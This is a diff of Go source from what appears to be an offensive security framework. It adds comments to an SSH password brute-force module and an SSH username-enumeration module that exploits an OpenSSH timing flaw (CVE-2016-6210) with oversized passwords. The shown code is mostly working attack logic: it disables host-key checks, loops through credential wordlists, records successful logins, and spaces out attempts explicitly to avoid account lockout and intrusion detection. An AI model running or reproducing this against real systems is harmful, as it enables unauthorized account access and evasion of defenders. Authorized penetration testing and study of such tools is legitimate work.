@@ -30,6 +30,7 @@ func sshHosts(ctx *attacks.AttackCtx, ns string) ([]net.IP, error) {
 		}
 		return out, nil
 	}
+	// No explicit host list: derive targets from the discovered inventory.
 	var out []net.IP
 	for _, h := range ctx.Store.Hosts() {
 		for _, p := range h.OpenPorts() {
@@ -46,7 +47,9 @@ func sshHosts(ctx *attacks.AttackCtx, ns string) ([]net.IP, error) {
 }
 
 // sshAttempt tries one password for a user. It returns (ok, authError) where
-// ok is true only on a successful login.
+// ok is true only on a successful login. Host-key verification is disabled on
+// purpose: this is an assessment tool, not a trusted-client; enabling it
+// would require the victim's host key out of band.
 func sshAttempt(addr, user, password string, timeout time.Duration) (bool, error) {
 	cfg := &ssh.ClientConfig{
 		User:            user,
@@ -54,6 +57,8 @@ func sshAttempt(addr, user, password string, timeout time.Duration) (bool, error
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 		Timeout:         timeout,
 	}
+	// A successful ssh.Dial completes the SSH transport + user auth handshake;
+	// reaching here proves the password is accepted for that user.
 	client, err := ssh.Dial("tcp", addr, cfg)
 	if err != nil {
 		return false, err
@@ -124,6 +129,7 @@ func (*SSHBrowse) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 		addr := net.JoinHostPort(ip.String(), "22")
 		for _, user := range users {
 			for _, pass := range passwords {
+				// Cooperative shutdown between attempts.
 				select {
 				case <-ctx.Done:
 					return nil
@@ -139,6 +145,8 @@ func (*SSHBrowse) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 				}
 				if ok {
 					found++
+					// Store.AddCred may be invoked from other goroutines via
+					// event callbacks, so the shared counter is guarded.
 					mu.Lock()
 					ctx.Store.AddCred(store.Cred{
 						Service:  "ssh",
@@ -154,6 +162,8 @@ func (*SSHBrowse) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 					ctx.Printf("[+] auth.brute: %s %s:%s\n", ip, user, pass)
 					break // found a password for this user on this host
 				}
+				// Pace the attempts: sleeping between failures is what keeps
+				// lockout policies and IDS from tripping.
 				time.Sleep(delay)
 			}
 		}
@@ -185,6 +195,12 @@ func (*SSHBrowse) Cleanup(ctx *attacks.AttackCtx) error { return nil }
 // password-auth failure, and it does so for valid users even when the password
 // is wrong, so valid usernames produce measurably slower failures. Sending a
 // deliberately huge password widens the gap (CVE-2016-6210 pattern).
+//
+// The technique relies on an OpenSSH behavioural quirk: for a non-existent
+// user the server rejects without hashing the password, while for an existing
+// user it always hashes first and fails afterwards. The extra SHA256 work for
+// valid users is tiny but measurable — and a ~512-byte password makes the
+// hash take noticeably longer on unpatched servers.
 type SSHUserEnum struct{}
 
 // Meta implements attacks.Module.
@@ -228,6 +244,8 @@ func (*SSHUserEnum) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 	timeout := ctx.Conf.GetDuration("auth.userenum", "timeout", 4*time.Second)
 	probes := ctx.Conf.GetInt("auth.userenum", "probes", 2)
 	threshold := ctx.Conf.GetDuration("auth.userenum", "threshold", 300*time.Millisecond)
+	// A 512-byte password amplifies the SHA256 hashing cost on servers that
+	// hash for valid users, widening the timing gap (CVE-2016-6210).
 	longPass := strings.Repeat("A", 512)
 
 	type probe struct {
@@ -235,10 +253,13 @@ func (*SSHUserEnum) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 		avg  time.Duration
 	}
 	var results []probe
+	// baseline is the fastest measured response and stands in for the
+	// "non-existent user" reference time.
 	baseline := time.Duration(0)
 	for _, ip := range hosts {
 		addr := net.JoinHostPort(ip.String(), "22")
 		for _, user := range users {
+			// Cooperative shutdown between probes.
 			select {
 			case <-ctx.Done:
 				return nil
@@ -261,6 +282,8 @@ func (*SSHUserEnum) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 			}
 			if measured > 0 {
 				avg := sum / time.Duration(measured)
+				// Track the fastest round-trip as the baseline; genuinely slow
+				// users will be compared against it.
 				if baseline == 0 || avg < baseline {
 					baseline = avg
 				}
@@ -268,10 +291,14 @@ func (*SSHUserEnum) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 			}
 		}
 	}
+	// Sort slowest first: the users most likely to be valid land at the top
+	// of the report.
 	sort.Slice(results, func(i, j int) bool { return results[i].avg > results[j].avg })
 
 	var candidates []string
 	for _, r := range results {
+		// Only a response clearly slower than the baseline is flagged; jitter
+		// from the network is filtered by the threshold.
 		if r.avg > baseline+threshold {
 			candidates = append(candidates, r.user)
 			ctx.Emit(events.TopicLog, fmt.Sprintf("auth.userenum: %s responds %v slower (candidate)", r.user, r.avg), nil)
@@ -299,7 +326,9 @@ func (*SSHUserEnum) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
 // Cleanup is a no-op.
 func (*SSHUserEnum) Cleanup(ctx *attacks.AttackCtx) error { return nil }
 
-// listConf loads a list from the named comma-knob or a wordlist file.
+// listConf loads a list from the named comma-knob or a wordlist file. The
+// inline comma list takes precedence; both are optional but one must be set,
+// which the returned error communicates.
 func listConf(ctx *attacks.AttackCtx, ns, knob, fileKnob string) ([]string, error) {
 	if raw := ctx.Conf.Get(ns, knob); strings.TrimSpace(raw) != "" {
 		var out []string
@@ -316,6 +345,7 @@ func listConf(ctx *attacks.AttackCtx, ns, knob, fileKnob string) ([]string, erro
 	return nil, fmt.Errorf("set %s.%s (or %s.%s to a wordlist file)", ns, knob, ns, fileKnob)
 }
 
+// Compile-time assertions that both module types satisfy the Module contract.
 var (
 	_ attacks.Module = (*SSHBrowse)(nil)
 	_ attacks.Module = (*SSHUserEnum)(nil)
